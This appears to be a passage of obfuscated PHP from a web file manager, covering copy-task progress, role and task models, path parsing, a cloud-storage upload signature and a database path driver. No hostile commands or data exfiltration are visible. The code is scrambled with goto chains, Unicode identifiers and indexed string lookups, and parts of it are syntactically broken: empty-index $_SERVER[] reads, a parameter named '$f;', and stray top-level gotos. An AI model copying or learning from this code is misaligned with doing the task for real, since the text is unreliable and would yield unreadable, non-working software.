static function updateTask(&$E䜱) { $Aǝ =& $_SERVER[]; if ($E䜱[$Aǝ[1600]] == $Aǝ[1111] || $E䜱[$Aǝ[1600]] == $Aǝ[107]) { if ($E䜱[$Aǝ[1594]]) { $E䜱[$Aǝ[1597]] = $E䜱[$Aǝ[1596]] + $E䜱[$Aǝ[1593]]; } } else { if ($E䜱[$Aǝ[1600]] == $Aǝ[1201]) { if ($E䜱[$Aǝ[1594]] == $Aǝ[1111]) { $E䜱[$Aǝ[1597]] = $E䜱[$Aǝ[1596]] + $E䜱[$Aǝ[1593]] * 0.5; } else { if ($E䜱[$Aǝ[1594]] == $Aǝ[107]) { $E䜱[$Aǝ[1597]] = $E䜱[$Aǝ[1596]] + $E䜱[$Aǝ[1592]] * 0.5 + $E䜱[$Aǝ[1593]] * 0.5; } } } } $E䜱[$Aǝ[1547]] = $E䜱[$Aǝ[1597]] / $E䜱[$Aǝ[740]]; if ($E䜱[$Aǝ[1547]] > 0) { $d׊ = timeFloat() - $E䜱[$Aǝ[766]] - $E䜱[$Aǝ[1550]]; $E䜱[$Aǝ[1551]] = $d׊ * (1 - $E䜱[$Aǝ[1547]]) / $E䜱[$Aǝ[1547]]; } } public function addPath($c٣) { goto Bꠍ; Bꠍ: $F廻 =& $_SERVER[]; if (!$c٣) { return; } $A穋 =& $this->task; goto FĻ; FĻ: $D՗ = IO::infoWithChildren($c٣); $EƜ = $A穋[$F廻[1601]] ? $A穋[$F廻[1601]][$F廻[1602]] : 0; $A穋[$F廻[1601]] = array($F廻[1602] => $EƜ + 1, $F廻[415] => $D՗[$F廻[28]], $F廻[76] => $D՗[$F廻[76]], $F廻[513] => $D՗[$F廻[513]] ? $D՗[$F廻[513]] : $D՗[$F廻[76]]); goto aə; aə: if ($D՗[$F廻[29]] == $F廻[193]) { $A穋[$F廻[1039]] += 1; } else { $A穋[$F廻[1039]] += $D՗[$F廻[81]][$F廻[79]]; if ($D՗[$F廻[397]]) { $A穋[$F廻[1039]] += $D՗[$F廻[81]][$F廻[80]] + 1; } } $A穋[$F廻[740]] += $D՗[$F廻[78]]; $this->update(); goto E墯; E墯: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($F) { $Dˊ =& $_SERVER[]; $Cߴ =& $this->task; $Cߴ[$Dˊ[1590]] = $F[$Dˊ[28]]; $Cߴ[$Dˊ[1041]] = $F[$Dˊ[28]]; $this->update(); } public function copyFileStart($D, $c֋կ, $A┹, $B⯎, $f, $A퇾) { goto a; C̯: $aǠ = $A[$b[1592]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($A[$b[395]] . $b[1605]); if ($aǠ && file_exists(get_path_father($B⯎))) { Cache::set($A[$b[395]] . $b[1605], $B⯎); $A[$b[1565]] = array($b[1606], $b[1607]); } goto fԈްш; a: $b =& $_SERVER[]; $f = $f; if ($f == $GLOBALS[$b[1603]]) { $f = $GLOBALS[$b[1604]]; } goto dǍ͋ӿ; cӓ̥: $A[$b[1590]] = $f; $A[$b[1592]] = (int) $D->size($c֋կ); $A[$b[1593]] = 0; goto Bæڤ; Bæڤ: $A[$b[1041]] = $b[33]; $A[$b[1594]] = $b[33]; $A[$b[1595]] = 0; goto C̯; fԈްш: $this->update(0, $aǠ); goto Dݠ솎; dǍ͋ӿ: $GLOBALS[$b[1604]] = $f; $GLOBALS[$b[1603]] = $A퇾; $A =& $this->task; goto cӓ̥; Dݠ솎: } public static function updateCopyLocalFileSize($eӠ) { goto EЯ; Fт: $eӠ[$eЋ[1593]] = @filesize($fÔƈ); $eӠ[$eЋ[1597]] += $eӠ[$eЋ[1593]]; self::updateTask($eӠ); goto c; EЯ: $eЋ =& $_SERVER[]; $fÔƈ = Cache::get($eӠ[$eЋ[395]] . $eЋ[1605]); if (!$fÔƈ || !file_exists($fÔƈ)) { return $eӠ; } goto Fт; c: return $eӠ; goto C僅; C僅: } public function copyFileEnd($f񤉈, $d؇, $aȋ, $bڼ, $E螕, $EŢ) { goto F; D: $eÆ[$e[1594]] = $e[33]; unset($eÆ[$e[1565]]); if ($E螕 == $eÆ[$e[1590]]) { $eÆ[$e[1596]] += $eÆ[$e[1592]]; $eÆ[$e[1597]] = $eÆ[$e[1596]]; $this->update(1); } else { $this->update(); $eÆ[$e[1593]] = 0; } goto dŵǑ; dŵǑ: Cache::remove($eÆ[$e[395]] . $e[1605]); self::log($e[1608] . $d؇ . $e[67] . $bڼ . $e[229] . $E螕 . $e[1609] . $eÆ[$e[1590]]); goto b¯; F: $e =& $_SERVER[]; $eÆ =& $this->task; $eÆ[$e[1593]] = $eÆ[$e[1592]]; goto D; b¯: } public function updateFileEnd($fӶߏ, $bɔխ) { goto C˃; C˃: $aĉ =& $_SERVER[]; $aĵ =& $this->task; $aĵ[$aĉ[1590]] = $fӶߏ; goto Eچơ; Eچơ: $aĵ[$aĉ[1592]] = $bɔխ; $aĵ[$aĉ[1596]] += $bɔխ; $aĵ[$aĉ[1597]] = $aĵ[$aĉ[1596]]; goto E್ܤ; E್ܤ: $this->update(1); self::log($aĉ[1610] . $fӶߏ); goto A; A: } public function sourceModelCopy($Bė) { goto F热; F热: $E܇˜ =& $_SERVER[]; $F՘ = $Bė[0]; $b键 = $Bė[1]; goto aմ; aմ: $A䡂 =& $this->task; $this->sourceModelCopyFlag = !0; $A޴ = 0; goto A; A: switch ($F՘) { case $E܇˜[560]: $A޴ = 1; break; case $E܇˜[563]: $A䡂[$E܇˜[1590]] = $b键[$E܇˜[28]]; break; case $E܇˜[565]: $A޴ = intval($Bė[$E܇˜[378]] * 0.4); break; case $E܇˜[567]: $A޴ = intval($Bė[$E܇˜[378]] * 0.2); break; case $E܇˜[569]: $A޴ = intval($Bė[$E܇˜[378]] * 0.4); break; } $this->update($A޴); $this->sourceModelCopyFlag = !1; goto F; F: } public function sourceRemove($D愲, $c) { $aپ =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $Eȧ = 1; if (isset($D愲[$aپ[81]])) { $Eȧ = $D愲[$aپ[81]][$aپ[79]] + $D愲[$aپ[81]][$aپ[80]] + 1; } $this->update($Eȧ); $this->sourceModelCopyFlag = !1; } public function sourceMove($dޖԍ) { $this->sourceRemove($dޖԍ, !1); } public function curlProgress($E, $D, $Aąʡ, $B, $Fƕ˞) { $A =& $_SERVER[]; $B̪ =& $this->task; if ($Fƕ˞ > 0) { $B̪[$A[1041]] = $A[1611]; $B̪[$A[1594]] = $A[107]; if ($B̪[$A[1592]]) { $B̪[$A[1593]] = $Fƕ˞; } if ($B̪[$A[1595]]) { $B̪[$A[1593]] = $Fƕ˞ + $B̪[$A[1595]]; } } else { if ($Aąʡ > 0) { if ($B̪[$A[1592]] == $D) { $B̪[$A[1593]] = $Aąʡ; $B̪[$A[1041]] = $A[1612]; $B̪[$A[1594]] = $A[1111]; } } } $this->update(); } public function curlProgressStart($Bܰ) { } public function curlProgressEnd($cʌ) { goto Aؿ; eܫ: $e܌ = $f[$bњ[1613]]; if ($e܌ == -1) { $e܌ = $f[$bњ[1614]]; } if ($bޡ[$bњ[1594]] == $bњ[107] && $e܌) { $bޡ[$bњ[1595]] += $e܌; } goto e; Aؿ: $bњ =& $_SERVER[]; $bޡ =& $this->task; $f = curl_getinfo($cʌ); goto eܫ; e: $this->update(); goto A; A: } } goto b; F繐: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\162\157\x6c\145\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\x61\165\164\150", "\x6c\141\x62\x65\154", "\144\151\163\x70\154\141\x79", "\163\171\x73\164\x65\155", "\144\x65\x73\143", "\x69\147\x6e\x6f\162\145\105\170\164", "\x69\x67\x6e\x6f\162\145\106\151\154\x65\123\151\x7a\x65", "\x61\144\x6d\x69\x6e\151\x73\164\x72\x61\164\x6f\162", "\163\x6f\x72\x74"); public function listData($aۋԔˤ = false, $cÈä = "\163\x6f\x72\x74", $Dד = false) { $f؆ =& $_SERVER[]; $A緥 = parent::listData($aۋԔˤ, $cÈä, $Dד); if (!$aۋԔˤ) { foreach ($A緥 as $CĽ => $e) { if ($e[$f؆[1907]] == 1) { $A緥[$CĽ][$f؆[445]] = LNG($f؆[2131]); } } } return $A緥; } public function update($b߳, $A︫ܱ) { goto dԲʫ; D൲: return parent::update($b߳, $A︫ܱ); goto eߎ; Cۂ: if (!$a || $F΃ && $F΃[$Eؼ[395]] != $a[$Eؼ[395]]) { return !1; } if ($F΃[$Eؼ[1907]] == 1) { $A︫ܱ = array($Eؼ[28] => $A︫ܱ[$Eؼ[28]], $Eؼ[1737] => $A︫ܱ[$Eؼ[1737]]); } $this->filterAuth($A︫ܱ[$Eؼ[408]]); goto D൲; dԲʫ: $Eؼ =& $_SERVER[]; $a = parent::listData($b߳); $F΃ = $this->findByName($A︫ܱ[$Eؼ[28]]); goto Cۂ; eߎ: } public function remove($CԈ䃋) { $eú٦ = parent::listData($CԈ䃋); if (!$eú٦ || $eú٦[$_SERVER[][1188]]) { return !1; } return parent::remove($CԈ䃋); } public function add($f;) { goto C磥֛; C魵: return parent::insert($f;); goto B; C磥֛: $Eڏ =& $_SERVER[]; $fΊ쨠 = $f;[$Eڏ[28]]; if ($this->findByName($fΊ쨠)) { return !1; } goto C; C: $a = array($Eڏ[415] => $fΊ쨠, $Eڏ[1721] => $Eڏ[33], $Eڏ[1717] => $Eڏ[1725], $Eڏ[2132] => 1, $Eڏ[1720] => 0, $Eڏ[2133] => 0, $Eڏ[1719] => $this->getSort()); $f; = array_merge($a, $f;); $this->filterAuth($f;[$Eڏ[408]]); goto C魵; B: } private function getSort() { $f޷񻚸 =& $_SERVER[]; $dҢ = parent::listData(); $d = array_to_keyvalue($dҢ, $f޷񻚸[33], $f޷񻚸[1738]); return empty($d) ? 0 : max($d) + 1; } private function filterAuth(&$d̖) { $fȾ =& $_SERVER[]; $aА = array(); $Cʺ = array_filter(explode($fȾ[47], $d̖)); foreach ($Cʺ as $d̖) { $Aџ = explode($fȾ[95], $d̖); if ($Aџ[0] == $fȾ[2134] && $Aџ[1] != $fȾ[1107]) { $E캸 = $Aџ[0] . $fȾ[95] . $Aџ[1] . $fȾ[2135]; if (!in_array($E캸, $Cʺ)) { $aА[] = $E캸; } } $aА[] = $d̖; } $d̖ = implode($fȾ[47], $aА); } public function sort($dӸ, $C) { return parent::update($dӸ, $C); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x74\141\163\153\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x74\171\x70\145", "\145\x76\145\x6e\x74", "\x74\151\x6d\x65", "\x64\x65\163\143", "\x73\171\x73\164\145\x6d", "\145\156\141\x62\x6c\145", "\x6c\x61\x73\164\x52\x75\x6e", "\163\x6f\x72\x74"); public function listData($cҿ = false, $DѺЪ = "\x73\157\x72\x74", $A = false) { return parent::listData($cҿ, $DѺЪ, $A); } public function add($D忺) { $cʯ =& $_SERVER[]; $Fâቅ = $this->findByName($D忺[$cʯ[28]]); if ($Fâቅ) { return !1; } $D忺[$cʯ[1510]] = 0; $D忺[$cʯ[1738]] = $this->getSort(); return parent::insert($D忺); } private function getSort() { $CҒ =& $_SERVER[]; $d = parent::listData(); $B = array_to_keyvalue($d, $CҒ[33], $CҒ[1738]); return empty($B) ? 0 : max($B) + 1; } public function update($bք, $f) { $c̡ =& $_SERVER[]; $AÜ = $this->listData($bք); $c = $this->findByName($f[$c̡[28]]); if (!$AÜ || $c && $c[$c̡[395]] != $AÜ[$c̡[395]]) { return !1; } return parent::update($bք, $f); } public function remove($bӠ, $aӐ = false) { $f٧ =& $_SERVER[]; $E = $this->listData($bӠ); if (!$E) { return; } if (!$aӐ && $E[$f٧[1188]] == $f٧[87]) { return !1; } return parent::remove($bӠ); } public function enable($b⒣, $dȴ) { return $this->update($b⒣, array($_SERVER[][2126] => $dȴ)); } public function run($CŇ) { return $this->update($CŇ, array($_SERVER[][2136] => time())); } } goto b; f: class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\x72\122\x65\x63\x79\143\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\163\x65\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\x46\151\154\x65\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\x69\154\x65\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\165\x70\122\x6f\x6f\164\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\162\x53\150\141\x72\x65\x4c\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\x72\145\111\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\111\164\x65\155\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\x63\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\x63\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\163\145\162\122\145\156\x63\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\166\x65\x72\175"; public static function typeList() { $cƶߐ =& $_SERVER[]; return array($cƶߐ[1156] => self::KOD_SOURCE, $cƶߐ[1157] => self::KOD_USER_RECYCLE, $cƶߐ[1158] => self::KOD_USER_FAV, $cƶߐ[1159] => self::KOD_USER_FILE_TAG, $cƶߐ[1160] => self::KOD_USER_FILE_TYPE, $cƶߐ[1161] => self::KOD_GROUP_ROOT_SELF, $cƶߐ[1162] => self::KOD_USER_SHARE, $cƶߐ[1163] => self::KOD_USER_SHARE_LINK, $cƶߐ[1164] => self::KOD_USER_SHARE_TO_ME, $cƶߐ[1165] => self::KOD_SHARE_ITEM, $cƶߐ[1166] => self::KOD_SHARE_LINK, $cƶߐ[1167] => self::KOD_SEARCH, $cƶߐ[1168] => self::KOD_BLOCK, $cƶߐ[1169] => self::KOD_IO, $cƶߐ[1170] => self::KOD_USER_RECENT, $cƶߐ[1171] => self::KOD_USER_DRIVER); } public static function parse($b) { goto bϸ; d: $a˸ = array($b̓޷[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $b魕ݵ[$b̓޷[1137]] = in_array($b魕ݵ[$b̓޷[29]], $a˸); return $b魕ݵ; goto Fۋϧ; bϸ: $b̓޷ =& $_SERVER[]; $b = self::clear($b); $Dć = array_values(self::typeList()); goto Cܱ; Cܱ: preg_match($b̓޷[1172], $b, $F×); $b魕ݵ = array($b̓޷[417] => !1, $b̓޷[1173] => !1, $b̓޷[414] => !1, $b̓޷[76] => $b, $b̓޷[1082] => !1, $b̓޷[1081] => $b̓޷[33]); if (is_array($F×) && count($F×) == 5) { $c = $b̓޷[1174] . $F×[2] . $b̓޷[325]; if (in_array($c, $Dć)) { $b魕ݵ[$b̓޷[1082]] = $F×[1]; $b魕ݵ[$b̓޷[29]] = $c; $b魕ݵ[$b̓޷[1175]] = substr($c, 1, -1); $b魕ݵ[$b̓޷[395]] = $F×[3]; } $b魕ݵ[$b̓޷[1081]] = $F×[4]; } goto d; Fۋϧ: } public static function isTruePath($a) { goto Aџ; F: if (strpos($a, $D㧌[1178]) === 0) { return !0; } return !1; goto a汼; Aџ: $D㧌 =& $_SERVER[]; if (substr($a, 0, 1) != $D㧌[1174]) { return !0; } if (strpos($a, $D㧌[403]) === 0) { return !0; } goto Aߐ; Aߐ: if (strpos($a, $D㧌[1141]) === 0) { return !0; } if (strpos($a, $D㧌[1176]) === 0) { return !0; } if (strpos($a, $D㧌[1177]) === 0) { return !0; } goto F; a汼: } public static function clear($b) { goto C׼; C׼: $b򆫸 =& $_SERVER[]; $b = str_replace(array($b򆫸[1055], $b򆫸[229]), $b򆫸[50], $b); $b = str_replace($b򆫸[97], $b򆫸[8], $b); goto Dȍ; b: return $b; goto B; FÊ: $b = preg_replace($b򆫸[1181], $b򆫸[8], $b); if ($b == $b򆫸[8]) { return $b򆫸[8]; } $b = rtrim($b, $b򆫸[8]); goto b; Dȍ: $Aظ߱ = $b򆫸[1179]; if (substr($b, 0, 3) == $b򆫸[1180]) { $b = substr($b, 3); } while (strstr($b, $Aظ߱)) { $b = str_replace($Aظ߱, $b򆫸[8], $b); } goto FÊ; B: } public static function sourceID($Dڠܢ) { $eެ =& $_SERVER[]; $C񨎢 = self::parse($Dڠܢ); if ($C񨎢[$eެ[29]] !== self::KOD_SOURCE) { show_json(LNG($eެ[1182]), !1); } return $C񨎢[$eެ[395]]; } public static function make($a) { if (!$a) { return !1; } return self::makePath(self::KOD_SOURCE, intval($a)); } public static function makeShare($B, $B) { return self::makePath(self::KOD_SHARE_ITEM, $B, $B); } public static function makeFileTypePath($B) { return self::makePath(self::KOD_USER_FILE_TYPE, $B); } public static function makeFileTagPath($aܴ) { return self::makePath(self::KOD_USER_FILE_TAG, $aܴ); } public static function makePath($a, $c솰 = '', $F = '') { $d =& $_SERVER[]; $C = substr($a, 1, -1); $eӫ = $d[1183] . $C . $d[1184] . $c솰 . $d[1185]; $eӫ = $F ? $eӫ . $F . $d[8] : $eӫ; return $eӫ; } public static function hashPath($e㿲, $E = true) { goto fی; fی: $D¼ =& $_SERVER[]; $c = is_array($e㿲) ? $e㿲 : IO::info($e㿲); $aԠ = _get($c, $D¼[1186], $D¼[33]); goto B唨; B唨: if (!$aԠ && isset($c[$D¼[397]])) { $c = IO::info(KodIO::make($c[$D¼[397]])); $aԠ = _get($c, $D¼[1186], $D¼[33]); } if (!$aԠ && $E) { $F = KodIO::parse($c[$D¼[76]]); if (!$F[$D¼[29]]) { $aԠ = IO::hashSimple($c[$D¼[76]]); } } if (!$aԠ) { $aԠ = md5($c[$D¼[76]] . $c[$D¼[78]] . $c[$D¼[84]]); } goto D՞; D՞: return $aԠ; goto Aĺԋڬ; Aĺԋڬ: } public static function initSystemPath() { goto E; E: $e菿 =& $_SERVER[]; if (defined($e菿[1187])) { return; } define($e菿[1187], self::systemPath($e菿[1188])); goto fݯ; d͍: IOHistory::bindEvent(); goto A; fݯ: define($e菿[1189], self::systemPath($e菿[1190])); define($e菿[1191], self::systemPath($e菿[1192])); define($e菿[1193], self::systemPath($e菿[1194])); goto d͍; A: } public static function systemPath($E) { goto a; E: if ($eз) { return $eз; } if ($E == $AĚ[1188]) { $eз = self::make(Model($AĚ[809])->systemRootPathAdd($AĚ[531])); } else { $eз = self::systemPath($AĚ[1188]); $cʍ = self::sourceID($eз); $eз = self::make(Model($AĚ[809])->mkdir($cʍ, $E)); } Model($AĚ[747])->set($Eڃ, $eз); goto Fױ; Fױ: return $eз; goto bڇ; a: $AĚ =& $_SERVER[]; $Eڃ = $AĚ[1195] . ucfirst($E); $eз = Model($AĚ[747])->get($Eڃ); goto E; bڇ: } public static function systemFolder($c͵) { $aڠ = IO_PATH_SYSTEM_SOURCE . $c͵; $BӍ = Cache::get($aڠ); if (!$BӍ) { $Fˤ = IO::infoFull($aڠ); if (!$Fˤ) { $BӍ = IO::mkdir($aڠ, REPEAT_SKIP); } else { $BӍ = $Fˤ[$_SERVER[][76]]; } Cache::set($aڠ, $BӍ, 3600 * 10); } return $BӍ; } public static function defaultDriver() { return Model($_SERVER[][744])->defaultDriver(); } public static function defaultIO() { $fǈՉ =& $_SERVER[]; $A = self::defaultDriver(); return $fǈՉ[1196] . $A[$fǈՉ[395]] . $fǈՉ[1185]; } public static function defaultDriverInit() { static $d = false; if ($d) { return $d; } $d = IO::init(self::defaultIO()); return $d; } public static function fileTypeList() { $fՄ =& $_SERVER[]; $D = $GLOBALS[$fՄ[6]][$fՄ[1197]]; foreach ($D as $cЇ˰ => $B) { $F듞 = $fՄ[1198] . $cЇ˰; $C͟접 = LNG($F듞); if ($F듞 != $C͟접) { $D[$cЇ˰][$fՄ[28]] = $C͟접; } } return $D; } public static function transferType($AԖ, $dџ) { goto Fء; d߷Ɇ: if ($A[$f뮽[29]] == $c[$f뮽[29]] && $A[$f뮽[1199]] == $c[$f뮽[1199]]) { return $f뮽[1200]; } if ($A[$f뮽[29]] == $f뮽[849] && $c[$f뮽[29]] == $f뮽[106]) { return $f뮽[1111]; } if ($A[$f뮽[29]] == $f뮽[106] && $c[$f뮽[29]] == $f뮽[849]) { return $f뮽[107]; } goto C݄; Fء: $f뮽 =& $_SERVER[]; $A = self::driverType($AԖ); $c = self::driverType($dџ); goto d߷Ɇ; C݄: return $f뮽[1201]; goto A܆; A܆: } public static function driverType($e농ӌѨ) { goto DӉ; dﴋ: if ($fۤʵ == $cމ[735] || $fۤʵ == $cމ[1203] || $fۤʵ == $cމ[1204]) { $e농ӌѨ = self::defaultDriverInit(); } else { if ($fۤʵ == $cމ[1118] || $fۤʵ == $cމ[1205]) { $e농ӌѨ = IO::init($e농ӌѨ->pathParse[$cމ[1065]]); } } $fۤʵ = str_replace($cމ[1202], $cމ[33], strtolower($e농ӌѨ->getType())); if ($fۤʵ == $cމ[106]) { return array($cމ[29] => $cމ[106], $cމ[1199] => $cމ[33], $cމ[76] => $e); } goto Dϰ; DӉ: $cމ =& $_SERVER[]; $e = $e농ӌѨ->path; $fۤʵ = str_replace($cމ[1202], $cމ[33], strtolower($e농ӌѨ->getType())); goto dﴋ; Dϰ: return array($cމ[29] => $cމ[849], $cމ[1199] => $e농ӌѨ->pathDriver, $cމ[76] => $e); goto E򒙎; E򒙎: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($cʎ) { parent::__construct($cʎ); $this->signatureVersion($_SERVER[][212]); } public function uploadFormData($e, $e𿵮؉ = 3600) { goto b; cݛ: $aܱ = array($Dǒ[1208] => $e͚͸, $Dǒ[1209] => array(array($Dǒ[1210] => $B䫌), array($Dǒ[1211] => $this->bucket), array($Dǒ[1212], $Dǒ[1213], $Dǒ[33]), array($Dǒ[1214] => $Fѫ), array($Dǒ[1215] => $a칣Ş), array($Dǒ[1216] => $this->accessKey), array($Dǒ[1217] => $Cڙ؜))); $aܱ = json_encode($aܱ); $Bܷ = hash_hmac($Dǒ[230], $Cڙ؜, $this->secret); goto f܅̧; f܅̧: $Fԣ = sha1($aܱ); $E쳋 = hash_hmac($Dǒ[230], $Fԣ, $Bܷ); $D = array($Dǒ[1210] => $B䫌, $Dǒ[1214] => $Fѫ, $Dǒ[1218] => base64_encode($aܱ), $Dǒ[1215] => $a칣Ş, $Dǒ[1216] => $this->accessKey, $Dǒ[1219] => $Cڙ؜, $Dǒ[1220] => $E쳋, $Dǒ[175] => $this->getHost()); goto D¾֌ʯ; D¾֌ʯ: return $D; goto Fß; b: $Dǒ =& $_SERVER[]; $B䫌 = $Dǒ[192]; $a칣Ş = $Dǒ[230]; goto Eê; Eê: $Fѫ = $Dǒ[1206]; $e͚͸ = gmdate($Dǒ[1207], time() + $e𿵮؉); $Cڙ؜ = (string) time() . $Dǒ[68] . (string) (time() + $e𿵮؉); goto cݛ; Fß: } public function fileOutLink($bĮ) { $b =& $_SERVER[]; if (substr($bĮ, 0, 7) == $b[1221]) { $bĮ = $b[1222] . substr($bĮ, 7); } header($b[159] . $bĮ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Eƶ) { $this->pathParse = $Eƶ; $this->model = Model($_SERVER[][1223]); } public function getPath($c̈́ڧ) { return trim($c̈́ڧ, $_SERVER[][8]); } public function pathFather($aνĸ) { $eЃ = $this->parse($aνĸ); $eЃ = $this->infoSimple($aνĸ); return $eЃ ? $eЃ[$_SERVER[][492]] : !1; } public function pathThis($d) { $Bè = $this->infoSimple($d); return $Bè ? $Bè[$_SERVER[][28]] : !1; } public function getPathOuter($fݐΧ) { if (!$fݐΧ) { return $fݐΧ; } $Fݲ걋 = $this->parse($fݐΧ); return KodIO::make($Fݲ걋[$_SERVER[][395]]); } public function copyFolderFromIO($bϜ, $f׹, $A, $Eˊ, $F) { $A = $this->model->copyFolderFromIO($bϜ, $f׹, $A, $Eˊ, $F); return KodIO::make($A); } public function isParentOf($a, $bԅɋ) { return $this->model->isParentOf($a, $bԅɋ); } public function mkfile($dδۂ, $cđ = '', $F = REPEAT_RENAME) { $FǕ =& $_SERVER[]; $Bݳ = $this->parse($dδۂ); $dδۂ = $Bݳ[$FǕ[395]]; for ($C = 0; $C < count($Bݳ[$FǕ[1224]]); $C++) { $Eݰ = $Bݳ[$FǕ[1224]][$C]; if ($C == count($Bݳ[$FǕ[1224]]) - 1) { $dδۂ = $this->model->mkfile($dδۂ, $Eݰ, $cđ, $F); break; } $dδۂ = $this->model->mkdir($dδۂ, $Eݰ, REPEAT_SKIP); } return $this->getPathOuter($dδۂ); } public function mkdir($C, $eՅ = REPEAT_SKIP) { $Cὸ쓺 =& $_SERVER[]; $Bړ憕Ū = $this->parse($C); $C = $Bړ憕Ū[$Cὸ쓺[395]]; for ($Bˍ = 0; $Bˍ < count($Bړ憕Ū[$Cὸ쓺[1224]]); $Bˍ++) { $b = $Bړ憕Ū[$Cὸ쓺[1224]][$Bˍ]; $C = $this->model->mkdir($C, $b, $eՅ); } return $this->getPathOuter($C); } public function copyFile($EƢ, $eƸˉ, $Eʋ = REPEAT_REPLACE) { $A㎶ =& $_SERVER[]; $a = $this->parse($eƸˉ); $c = $this->model->copy($EƢ, $a[$A㎶[395]], $Eʋ, $a[$A㎶[76]]); return $c ? $this->getPathOuter($c) : !1; } public function moveFile($Fϖȶ, $Bۄ, $eх = REPEAT_REPLACE) { $B =& $_SERVER[]; $BǬ = $this->parse($Bۄ); $Eꋉ = $this->model->move($Fϖȶ, $BǬ[$B[395]], $eх, $BǬ[$B[76]]); return $Eꋉ ? $this->getPathOuter($Eꋉ) : !1; } public function copy($bҩ, $AѼ, $eӏ = REPEAT_REPLACE) { $eȸ = $this->parse($AѼ); $e籾 = $this->model->copy($bҩ, $eȸ[$_SERVER[][395]], $eӏ); return $e籾 ? $this->getPathOuter($e籾) : !1; } public function moveSameAllow() { } public function move($E, $F, $f = REPEAT_REPLACE) { $D = $this->parse($F); $B = $this->model->move($E, $D[$_SERVER[][395]], $f); return $B ? $this->getPathOuter($B) : !1; } public function remove($Bߓ, $f׻Ȇ = true) { return $this->model->remove($Bߓ, $f׻Ȇ); } public function rename($Bϻ׿, $Eױ) { $e = $this->model->rename($Bϻ׿, $Eױ); return $e ? $this->getPathOuter($Bϻ׿) : $e; } public function size($aʢ) { $dӋ = $this->infoSimple($aʢ); return $dӋ ? $dӋ[$_SERVER[][78]] : 0; } public function infoSimple($f) { return $this->model->sourceInfo($f); } public function info($aїΒ) { return $this->infoParse($aїΒ); } public function infoAuth($cŨ) { return $this->infoParse($cŨ, !1, !0); } public function infoWithChildren($AǾ) { return $this->infoParse($AǾ, !0); } protected function infoParse($Eÿ, $f蟎 = false, $b = false) { if (!$f蟎) { return $this->model->pathInfo($Eÿ, $b); } return $this->model->pathInfoMore($Eÿ); } public function infoFull($dƩ) { $d =& $_SERVER[]; $eڎ = explode($d[8], $dƩ); $Cðﶉ = implode($d[8], array_splice($eڎ, 1)); return $this->model->pathInfoByPath($eڎ[0], $Cðﶉ); } public function hashSimple($eƼ) { $D =& $_SERVER[]; $e籠 = $this->infoWithChildren($eƼ); return $e籠[$D[164]][$D[171]]; } public function hashMd5($EƎ) { $A =& $_SERVER[]; $c̺ = $this->infoWithChildren($EƎ); return $c̺[$A[164]][$A[170]]; } public function exist($C) { $bٯ =& $_SERVER[]; $E՗ԃ = $this->parse($C); if (!$E՗ԃ[$bٯ[76]]) { return $this->isFile($C) || $this->isFolder($C); } $cϷθ = array($bٯ[396] => $E՗ԃ[$bٯ[395]], $bٯ[28] => $E՗ԃ[$bٯ[76]]); $b = $this->model->where($cϷθ)->find(); return $b ? !0 : !1; } public function isFile($E֐郗) { $F =& $_SERVER[]; $C = $this->infoSimple($E֐郗); return $C && $C[$F[405]] == $F[87] ? !1 : !0; } public function isFolder($a) { $f͊ =& $_SERVER[]; $Aՙ = $this->infoSimple($a); return $Aՙ && $Aՙ[$f͊[405]] == $f͊[87] ? !0 : !1; } public function listPath($EΛ, $F܆ɮ = false) { $bЕ =& $_SERVER[]; if ($EΛ == $bЕ[33]) { return !1; } $D̉ = array($bЕ[396] => $EΛ); if ($F܆ɮ) { return $this->model->listSource($D̉, -1); } return $this->model->listSource($D̉); } public function has($DԶ, $B = false, $Eюʠ = null) { $bΡӅ =& $_SERVER[]; $eڌ͓ = $this->infoWithChildren($DԶ); if ($B) { return array($bΡӅ[204] => $eڌ͓[$bΡӅ[204]], $bΡӅ[203] => $eڌ͓[$bΡӅ[203]]); } return $Eюʠ ? $eڌ͓[$bΡӅ[204]] : $eڌ͓[$bΡӅ[203]]; } public function listAll($D) { $f׮ = IO::info($this->pathParse[$_SERVER[][76]]); if (!$f׮) { return array(); } return $this->model->listAll($D); } public function getContent($Dя) { return $this->model->getContent($Dя); } public function setContent($FԷ, $b = '') { return $this->model->setContent($FԷ, $b); } public function fileSubstr($B, $eث棋, $AĒ) { return $this->model->fileSubstr($B, $eث棋, $AĒ); } public function download($dԉ, $Fӭٖ = '') { $A͈ = get_path_father($Fӭٖ); $e = get_path_this($Fӭٖ); $B؅ = $this->model->fileInfoGet($dԉ); $dг¡ = IO::copy($B؅[$_SERVER[][76]], $A͈, !1, $e); return 